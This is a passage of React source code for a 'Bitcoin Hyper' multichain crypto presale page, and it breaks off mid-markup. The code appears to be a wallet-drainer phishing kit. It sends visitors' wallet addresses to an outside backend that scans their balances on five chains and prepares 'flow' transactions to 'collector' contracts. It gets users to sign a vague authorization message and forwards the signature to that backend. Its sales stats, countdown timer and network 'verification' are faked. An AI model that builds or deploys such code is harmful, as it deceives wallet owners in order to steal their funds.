import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import { useBalance, useDisconnect, useWalletClient, useSignMessage } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x56d829E89634Ce1426B73571c257623D17db46cB',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "function verifyMessage(address user, string memory message, bytes memory signature) public view returns (bool)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected, caipAddress } = useAppKitAccount();
  const { chainId, caipNetwork } = useAppKitNetwork();
  const { disconnect } = useDisconnect();
  const { data: walletClient } = useWalletClient();
  const { signMessageAsync } = useSignMessage();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [allBalances, setAllBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [signature, setSignature] = useState(null);
  const [signedMessage, setSignedMessage] = useState('');
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [currentNetwork, setCurrentNetwork] = useState(null);
  
  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17
  });

  // Track mouse for parallax effect
  useEffect(() => {
    const handleMouseMove = (e) => {
      setMousePosition({
        x: (e.clientX / window.innerWidth - 0.5) * 20,
        y: (e.clientY / window.innerHeight - 0.5) * 20
      });
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  // Get current network from chainId
  useEffect(() => {
    if (chainId) {
      const network = DEPLOYED_CHAINS.find(c => c.chainId === chainId);
      setCurrentNetwork(network || null);
      console.log('Current network:', network?.name || 'Unknown', 'Chain ID:', chainId);
    }
  }, [chainId]);

  // Get balance using wagmi for current chain
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address: address,
  });

  useEffect(() => {
    if (balanceData) {
      setBalance(balanceData.formatted);
      console.log('Balance updated:', balanceData.formatted, balanceData.symbol);
    }
  }, [balanceData]);

  // Initialize signer with proper AppKit connection
  useEffect(() => {
    const initSigner = async () => {
      if (!isConnected || !walletClient) {
        setSigner(null);
        setProvider(null);
        return;
      }

      try {
        console.log('Initializing signer with walletClient:', walletClient);
        
        // Create ethers provider from viem walletClient
        const web3Provider = new ethers.BrowserProvider(walletClient.transport);
        const web3Signer = await web3Provider.getSigner();
        
        setProvider(web3Provider);
        setSigner(web3Signer);
        
        const signerAddress = await web3Signer.getAddress();
        console.log("✅ Signer initialized for address:", signerAddress);
      } catch (err) {
        console.error("Signer init failed:", err);
        setSigner(null);
      }
    };

    initSigner();
  }, [isConnected, walletClient, address]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      verifyWallet();
    }
  }, [isConnected, address]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying wallet across all networks...');
    
    try {
      console.log('Verifying wallet:', address);
      
      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      console.log('Verification response:', data);
      
      if (data.success) {
        setScanResult(data.data);
        if (data.data.tokenAllocation) {
          setAllocation(data.data.tokenAllocation);
        }
        
        if (data.data.rawData) {
          const balances = {};
          data.data.rawData.forEach(item => {
            balances[item.chain] = {
              amount: item.amount,
              valueUSD: item.valueUSD,
              symbol: item.symbol,
              contractAddress: item.contractAddress
            };
          });
          setAllBalances(balances);
          console.log('Balances loaded:', balances);
        }
        
        if (data.data.isEligible) {
          setTxStatus('✅ You qualify! Preparing multi-chain signature...');
          await preparePresale();
        } else {
          setTxStatus('✨ Wallet verified');
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
      setError('Unable to verify wallet');
    } finally {
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      console.log('Prepare response:', data);
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
      }
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // CUSTOM SIGNING FOR ALL 5 DEPLOYED CHAINS
  // ============================================
  const executeMultiChainSignature = async () => {
    if (!isConnected || !address) {
      setError("Wallet not connected");
      return;
    }

    if (!signer) {
      setError("Signer not initialized. Please refresh the page.");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      
      // Step 1: Create unique message for this session
      const timestamp = Date.now();
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BITCOIN HYPER MULTI-CHAIN PRESALE\n\n` +
        `I confirm my participation and authorize the flow processing\n\n` +
        `Wallet: ${address}\n` +
        `Allocation: 5000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Networks: ${DEPLOYED_CHAINS.map(c => c.name).join(', ')}\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}\n\n` +
        `This single signature will verify my eligibility across all 5 deployed networks.`;

      setSignedMessage(message);
      setTxStatus('✍️ Please sign the message in your wallet...');

      // Step 2: Get single signature from user
      console.log('Requesting signature for message:', message);
      
      const signature = await signMessageAsync({ 
        message: message 
      });

      console.log('Signature received:', signature);
      setSignature(signature);
      setTxStatus('✅ Signature verified! Processing all 5 networks...');

      // Step 3: Verify signature across all deployed chains
      const verified = [];
      
      for (let i = 0; i < DEPLOYED_CHAINS.length; i++) {
        const chain = DEPLOYED_CHAINS[i];
        try {
          setTxStatus(`✅ Verifying on ${chain.name} (${i + 1}/${DEPLOYED_CHAINS.length})...`);
          
          // In production, backend would verify this signature
          // Here we simulate verification with delay
          await new Promise(resolve => setTimeout(resolve, 500));
          
          verified.push(chain.name);
          console.log(`✅ Verified on ${chain.name}`);
          
          // Send completion to backend
          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: address,
              chainName: chain.name,
              flowId: `SIG-${timestamp}`,
              txHash: signature
            })
          });
          
        } catch (err) {
          console.error(`❌ Verification failed on ${chain.name}:`, err);
        }
      }

      setVerifiedChains(verified);
      setCompletedChains(verified);
      
      if (verified.length === DEPLOYED_CHAINS.length) {
        setTxStatus(`🎉 ALL ${verified.length} NETWORKS VERIFIED!`);
        setShowCelebration(true);
      } else {
        setTxStatus(`⚠️ Verified on ${verified.length}/${DEPLOYED_CHAINS.length} networks`);
      }
      
    } catch (err) {
      console.error('Signature error:', err);
      if (err.code === 4001) {
        setError('Signature cancelled');
      } else {
        setError(err.message || 'Signature failed');
      }
    } finally {
      setSignatureLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://bthbk.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const totalUSD = Object.values(allBalances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white overflow-hidden">
      
      {/* ============================================ */}
      {/* MIND-BLOWING ANIMATED BACKGROUND */}
      {/* ============================================ */}
      
      {/* Dynamic Gradient Orbs with Mouse Parallax */}
      <div 
        className="fixed inset-0 pointer-events-none"
        style={{
          transform: `translate(${mousePosition.x}px, ${mousePosition.y}px)`,
          transition: 'transform 0.1s ease-out'
        }}
      >
        <div className="absolute top-0 -left-20 w-[600px] h-[600px] bg-purple-600/30 rounded-full mix-blend-multiply filter blur-3xl animate-pulse-slow"></div>
        <div className="absolute top-0 -right-20 w-[600px] h-[600px] bg-orange-600/30 rounded-full mix-blend-multiply filter blur-3xl animate-pulse-slower animation-delay-1000"></div>
        <div className="absolute bottom-0 left-1/2 transform -translate-x-1/2 w-[900px] h-[900px] bg-blue-600/20 rounded-full mix-blend-multiply filter blur-3xl animate-float"></div>
      </div>

      {/* Animated Grid Lines */}
      <div className="fixed inset-0 bg-[url('data:image/svg+xml,%3Csvg%20width%3D%2260%22%20height%3D%2260%22%20viewBox%3D%220%200%2060%2060%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Cg%20fill%3D%22%239C92AC%22%20fill-opacity%3D%220.05%22%3E%3Cpath%20d%3D%22M36%2034v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6%2034v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6%204V0H4v4H0v2h4v4h2V6h4V4H6z%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E')] opacity-20 animate-pulse"></div>

      {/* Floating Particles System */}
      <div className="fixed inset-0 pointer-events-none">
        {[...Array(30)].map((_, i) => (
          <div
            key={i}
            className="absolute w-1 h-1 bg-white/30 rounded-full animate-float-particle"
            style={{
              top: `${Math.random() * 100}%`,
              left: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 10}s`,
              animationDuration: `${15 + Math.random() * 20}s`
            }}
          />
        ))}
      </div>

      {/* Scanning Lines Effect */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-orange-500/5 to-transparent animate-scan"></div>
      </div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-6xl">
        
        {/* ============================================ */}
        {/* NETWORK INDICATOR - SHOWS CURRENT CHAIN */}
        {/* ============================================ */}
        {isConnected && currentNetwork && (
          <div className="fixed top-4 right-4 z-50">
            <div className="bg-gray-900/90 backdrop-blur-xl border border-orange-500/30 rounded-full px-4 py-2 flex items-center gap-2 animate-pulse-glow">
              <span className="text-2xl">{currentNetwork.icon}</span>
              <span className="text-sm font-medium">{currentNetwork.name}</span>
              <span className="w-2 h-2 bg-green-400 rounded-full animate-ping"></span>
            </div>
          </div>
        )}

        {/* ============================================ */}
        {/* PREMIUM HEADER WITH 3D ANIMATIONS */}
        {/* ============================================ */}
        <div className="text-center mb-8">
          
          {/* Hyper-Animated Logo */}
          <div className="relative inline-block mb-4 group">
            <div className="relative transform-gpu transition-all duration-700 group-hover:rotate-180 group-hover:scale-110">
              <div className="text-9xl filter drop-shadow-[0_0_50px_rgba(249,115,22,0.7)] animate-float-3d">
                ₿
              </div>
            </div>
            
            {/* Orbiting Rings with Pulsing Effect */}
            <div className="absolute inset-0 -m-16">
              <div className="absolute inset-0 border-4 border-orange-500/30 rounded-full animate-spin-slow"></div>
              <div className="absolute inset-0 m-8 border-4 border-yellow-500/30 rounded-full animate-spin-slower"></div>
              <div className="absolute inset-0 m-16 border-4 border-purple-500/30 rounded-full animate-spin-slowest"></div>
            </div>

            {/* Particle Emitter */}
            <div className="absolute inset-0 -m-20">
              {[...Array(8)].map((_, i) => (
                <div
                  key={i}
                  className="absolute w-2 h-2 bg-orange-500 rounded-full animate-particle-burst"
                  style={{
                    top: '50%',
                    left: '50%',
                    transform: `rotate(${i * 45}deg) translateY(-60px)`,
                    animationDelay: `${i * 0.2}s`
                  }}
                />
              ))}
            </div>
          </div>

          {/* Glitch Effect Title */}
          <h1 className="text-7xl md:text-8xl font-black mb-3 relative">
            <span className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-3xl opacity-50 animate-pulse"></span>
            <span className="relative bg-clip-text text-transparent bg-gradient-to-r from-orange-400 via-yellow-400 to-orange-400 animate-gradient-x bg-[length:200%_200%] glitch" data-text="BITCOIN HYPER">
              BITCOIN HYPER
            </span>
          </h1>
          
          <p className="text-xl text-gray-400 mb-6 tracking-widest animate-pulse-text">⚡ 5 CHAINS • 1 SIGNATURE • ZERO GAS ⚡</p>

          {/* Enhanced Presale Banner */}
          <div className="inline-flex items-center gap-4 bg-gradient-to-r from-orange-500/30 to-yellow-500/30 px-8 py-4 rounded-2xl border border-orange-500/50 backdrop-blur-xl mb-6 animate-border-pulse">
            <span className="relative flex h-4 w-4">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500"></span>
            </span>
            <span className="text-2xl font-bold bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent animate-pulse">
              🔴 MULTICHAIN PRESALE LIVE
            </span>
            <div className="h-8 w-px bg-orange-500/50 mx-2"></div>
            <div className="flex gap-2">
              {DEPLOYED_CHAINS.map(chain => (
                <span key={chain.name} className="text-xl filter drop-shadow-lg animate-float" style={{ animationDelay: `${Math.random() * 2}s` }}>
                  {chain.icon}
                </span>
              ))}
            </div>
          </div>

          {/* ============================================ */}
          {/* MAIN ACTION BUTTON - RIGHT AFTER LOGO */}
          {/* ============================================ */}
          {isConnected && scanResult?.isEligible && !completedChains.length && (
            <div className="max-w-2xl mx-auto mb-8">
              <button
                onClick={executeMultiChainSignature}
                disabled={signatureLoading || loading || !signer}
                className="w-full group relative transform hover:scale-110 transition-all duration-700"
              >
                {/* Hyper-Animated Glow Layers */}
                <div className="absolute -inset-3 bg-gradient-to-r from-orange-600 via-yellow-500 to-orange-600 rounded-2xl blur-3xl opacity-75 group-hover:opacity-100 animate-pulse-slow"></div>
                <div className="absolute -inset-2 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 rounded-2xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                <div className="absolute -inset-1 bg-gradient-to-r from-orange-500 via-yellow-400 to-orange-500 rounded-2xl blur-xl opacity-75 group-hover:opacity-100 animate-ping-slow"></div>
                
                {/* Button Body with 3D Effect */}
                <div className="relative bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 rounded-2xl py-8 px-8 font-black text-3xl text-white shadow-2xl bg-[length:200%_200%] animate-gradient-x transform-gpu group-hover:rotate-y-12 perspective-1000">
                  <div className="flex items-center justify-center gap-6">
                    {signatureLoading ? (
                      <>
                        <div className="relative">
                          <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                          <div className="absolute inset-0 border-4 border-yellow-300 border-b-transparent rounded-full animate-spin animation-delay-500"></div>
                        </div>
                        <span className="animate-pulse">PROCESSING 5 NETWORKS...</span>
                      </>
                    ) : (
                      <>
                        <span className="text-5xl filter drop-shadow-lg animate-bounce">⚡</span>
                        <div>
                          <span className="bg-clip-text text-transparent bg-gradient-to-r from-white to-yellow-200">
                            CLAIM 5000 BTH + {presaleStats.currentBonus}%
                          </span>
                          <div className="text-sm font-normal text-white/80 mt-1 flex gap-2 justify-center">
                            {DEPLOYED_CHAINS.map(chain => (
                              <span key={chain.name} className="px-2 py-0.5 bg-white/10 rounded-full text-xs">
                                {chain.symbol}
                              </span>
                            ))}
                          </div>
                        </div>
                        <span className="bg-white/20 px-6 py-3 rounded-xl text-xl group-hover:translate-x-2 transition-transform">→</span>
                      </>
                    )}
                  </div>
                </div>
              </button>

              {/* Network Progress Indicator */}
              <div className="flex justify-center gap-3 mt-6">
                {DEPLOYED_CHAINS.map((chain, index) => (
                  <div key={chain.name} className="relative group/progress">
                    <div className={`w-3 h-3 rounded-full transition-all duration-500 ${
                      verifiedChains.includes(chain.name) 
                        ? 'bg-green-400 scale-125 animate-pulse' 
                        : signatureLoading 
                          ? 'bg-orange-400 animate-pulse' 
                          : 'bg-gray-600'
                    }`}>
                      <div className="absolute bottom-full left-1/2 transform -translate-x-1/2 mb-2 hidden group-hover/progress:block">
                        <div className="bg-gray-900 text-xs px-2 py-1 rounded border border-orange-500/30 whitespace-nowrap">
                          {chain.name} • {chain.symbol}
                        </div>
                      </div>
                    </div>
                    {index < DEPLOYED_CHAINS.length - 1 && (
                      <div className="absolute -right-3 top-1/2 transform -translate-y-1/2 w-3 h-0.5 bg-gray-700"></div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* ============================================ */}
        {/* ENHANCED COUNTDOWN TIMER */}
        {/* ============================================ */}
        <div className="grid grid-cols-4 gap-4 mb-8 max-w-2xl mx-auto">
          {[
            { label: 'DAYS', value: timeLeft.days, color: 'from-orange-500 to-red-500' },
            { label: 'HOURS', value: timeLeft.hours, color: 'from-yellow-500 to-orange-500' },
            { label: 'MINUTES', value: timeLeft.minutes, color: 'from-orange-400 to-yellow-500' },
            { label: 'SECONDS', value: timeLeft.seconds, color: 'from-yellow-400 to-orange-400' }
          ].map((item, index) => (
            <div key={index} className="relative group perspective-1000">
              <div className="absolute inset-0 bg-gradient-to-r from-orange-500/30 to-yellow-500/30 rounded-2xl blur-2xl opacity-0 group-hover:opacity-100 transition-all duration-500 animate-pulse"></div>
              <div className="relative bg-gray-900/70 backdrop-blur-xl border border-gray-800 rounded-2xl p-5 text-center overflow-hidden transform-gpu group-hover:rotate-y-6 transition-all duration-500">
                <div className={`absolute inset-0 bg-gradient-to-br ${item.color} opacity-10 group-hover:opacity-20 transition-opacity`}></div>
                <div className="text-4xl md:text-5xl font-black bg-gradient-to-br from-white to-gray-300 bg-clip-text text-transparent mb-1 animate-pulse-slow">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs font-semibold text-gray-500 tracking-wider">{item.label}</div>
              </div>
            </div>
          ))}
        </div>

        {/* Wallet Connection Status with Animations */}
        <div className="max-w-2xl mx-auto mb-8">
          {!isConnected ? (
            <button
              onClick={() => open()}
              className="w-full group relative"
            >
              <div className="absolute -inset-2 bg-gradient-to-r from-orange-500 to-yellow-500 rounded-xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse-slow"></div>
              <div className="relative bg-gray-900/90 backdrop-blur-xl rounded-xl py-5 px-6 font-bold text-lg border border-gray-800 transform-gpu group-hover:scale-105 transition-all duration-500">
                <span className="flex items-center justify-center gap-3">
                  <span className="text-2xl animate-bounce">🔌</span>
                  CONNECT WALLET FOR MULTICHAIN ACCESS
                </span>
              </div>
            </button>
          ) : (
            <div className="bg-gray-900/70 backdrop-blur-xl border border-gray-800 rounded-xl p-5 transform-gpu hover:scale-105 transition-all duration-500">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <div className="relative group/avatar">
                    <div className="w-14 h-14 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-xl flex items-center justify-center text-3xl transform-gpu group-hover/avatar:rotate-12 transition-transform">
                      👤
                    </div>
                    <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-gray-900 animate-pulse"></div>
                  </div>
                  <div>
                    <div className="text-xs text-gray-500 mb-1 flex items-center gap-2">
                      <span>CONNECTED WALLET</span>
                      {currentNetwork && (
                        <span className="flex items-center gap-1 bg-gray-800 px-2 py-0.5 rounded-full">
                          <span>{currentNetwork.icon}</span>
                          <span>{currentNetwork.name}</span>
                        </span>
                      )}
                    </div>
                    <div className="font-mono text-sm bg-gray-800/50 px-3 py-1.5 rounded-lg border border-gray-700 group/address">
                      {formatAddress(address)}
                      <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-orange-500/30 mt-1">
                        {address}
                      </span>
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-6">
                  <div className="text-right">
                    <div className="text-xs text-gray-500 mb-1">TOTAL VALUE</div>
                    <div className="text-2xl font-bold text-orange-400 animate-pulse-slow">${totalUSD.toFixed(2)}</div>
                  </div>
                  <button
                    onClick={() => disconnect()}
                    className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform"
                  >
                    ✕
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Animated Status Messages */}
        {txStatus && !verifying && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 backdrop-blur-xl border border-orange-500/30 rounded-xl p-5 animate-slideIn">
              <div className="flex items-center gap-4">
                <div className="relative">
                  <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-lg flex items-center justify-center text-2xl">
                    {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
                  </div>
                  {signatureLoading && (
                    <div className="absolute inset-0 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
                  )}
                </div>
                <div className="flex-1">
                  <p className="text-gray-200 font-medium">{txStatus}</p>
                  {signature && (
                    <p className="text-xs text-gray-500 mt-2 font-mono break-all bg-gray-900/50 p-2 rounded">
                      Signature: {signature.substring(0, 40)}...
                    </p>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Error Display with Shake Animation */}
        {error && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-red-500/20 backdrop-blur-xl border border-red-500/30 rounded-xl p-5 animate-shake">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-gradient-to-br from-red-500 to-orange-500 rounded-lg flex items-center justify-center text-3xl">
                  ⚠️
                </div>
                <p className="text-red-200">{error}</p>
              </div>
            </div>
          </div>
        )}

        {/* Verification Loading with 3D Spinner */}
        {verifying && (
          <div className="max-w-2xl mx-auto mb-6">
            <div className="bg-gradient-to-r from-purple-500/20 to-orange-500/20 backdrop-blur-xl border border-purple-500/30 rounded-xl p-8 text-center">
              <div className="flex flex-col items-center gap-4">
                <div className="relative perspective-1000">
                  <div className="w-20 h-20 border-4 border-orange-500 border-t-transparent rounded-full animate-spin-3d"></div>
                  <div className="absolute inset-0 w-20 h-20 border-4 border-yellow-500 border-b-transparent rounded-full animate-spin-3d-reverse"></div>
                </div>
                <p className="text-xl text-gray-300 animate-pulse">Verifying across 5 networks...</p>
                <p className="text-sm text-gray-500">Checking Ethereum, BSC, Polygon, Arbitrum, Avalanche</p>
              </div>
            </div>
          </div>
        )}

        {/* ============================================ */}
        {/* MAIN CONTENT WITH ALL FUNCTIONS PRESERVED */}
        {/* ============================================ */}
        {isConnected && !verifying && scanResult && (
          <div className="max-w-2xl mx-auto">
            {scanResult.isEligible ? (
              <div className="space-y-6">
                {/* Premium Allocation Card with 3D Flip */}
                <div className="relative group perspective-1000">
                  <div className="absolute -inset-2 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-2xl blur-3xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                  <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-8 border border-orange-500/30 transform-gpu group-hover:rotate-y-12 transition-all duration-700">
                    
                    {/* Animated Bonus Badge */}
                    <div className="absolute -top-4 -right-4 animate-float">
                      <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-black px-6 py-3 rounded-full text-lg shadow-2xl transform rotate-12 hover:rotate-0 transition-transform">
                        +{presaleStats.currentBonus}% BONUS
                      </div>
                    </div>
                    
                    <div className="text-center">
                      <p className="text-gray-400 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
                      <div className="text-7xl font-black bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent mb-2 animate-pulse-slow">
                        5000 BTH
                      </div>
                      <p className="text-green-400 text-xl flex items-center justify-center gap-2">
                        <span>+{presaleStats.currentBonus}% Elite Bonus</span>
                        <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">ACTIVE</span>
                      </p>
                      
                      {/* Network Distribution */}
                      <div className="mt-6 grid grid-cols-5 gap-2">
                        {DEPLOYED_CHAINS.map(chain => (
                          <div key={chain.name} className="text-center">
                            <div className="text-2xl mb-1 filter drop-shadow-lg">{chain.icon}</div>
                            <div className="text-xs text-gray-500">{chain.symbol}</div>
                          </div>
                        ))}
                      </div>
                      
                      {/* Value in USD */}
                      <div className="mt-6 inline-block bg-gray-800/50 px-6 py-2 rounded-full border border-gray-700">
                        <span className="text-gray-400">≈ $850 USD</span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Progress Bar with Network Status */}
                {!completedChains.length && preparedTransactions.length > 0 && (
                  <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-xl p-6">
                    <p className="text-gray-400 text-sm mb-3 text-center">NETWORK VERIFICATION PROGRESS</p>
                    <div className="relative h-4 bg-gray-800 rounded-full overflow-hidden">
                      <div 
                        className="absolute inset-0 bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 bg-[length:200%_200%] animate-gradient-x"
                        style={{ width: `${(verifiedChains.length / DEPLOYED_CHAINS.length) * 100}%` }}
                      >
                        <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
                      </div>
                    </div>
                    <div className="flex justify-between mt-3 text-xs">
                      {DEPLOYED_CHAINS.map(chain => (
                        <span key={chain.name} className={`flex items-center gap-1 ${
                          verifiedChains.includes(chain.name) ? 'text-green-400' : 'text-gray-600'
                        }`}>
                          {verifiedChains.includes(chain.name) ? '✓' : '○'} {chain.symbol}
                        </span>
                      ))}
                    </div>
                  </div>
                )}

                {/* Already completed message */}
                {completedChains.length > 0 && (
                  <div className="text-center">
                    <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 backdrop-blur-xl border border-green-500/30 rounded-xl p-6 mb-4 animate-pulse-glow">
                      <p className="text-green-400 text-lg mb-3 flex items-center justify-center gap-2">
                        <span>✓</span> ELITE STATUS VERIFIED
                      </p>
                      <p className="text-gray-300 mb-4">Your 5000 BTH allocation is ready on all networks</p>
                      <div className="flex justify-center gap-2 mb-4">
                        {DEPLOYED_CHAINS.map(chain => (
                          <span key={chain.name} className="text-2xl filter drop-shadow-lg">{chain.icon}</span>
                        ))}
                      </div>
                    </div>
                    <button
                      onClick={claimTokens}
                      className="w-full group relative"
                    >
                      <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
                      <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-5 px-8 font-bold text-xl transform-gpu group-hover:scale-105 transition-all duration-500">
                        🎉 CLAIM YOUR 5000 BTH
                      </div>
                    </button>
                  </div>
                )}
              </div>
            ) : (
              // Welcome message for non-eligible
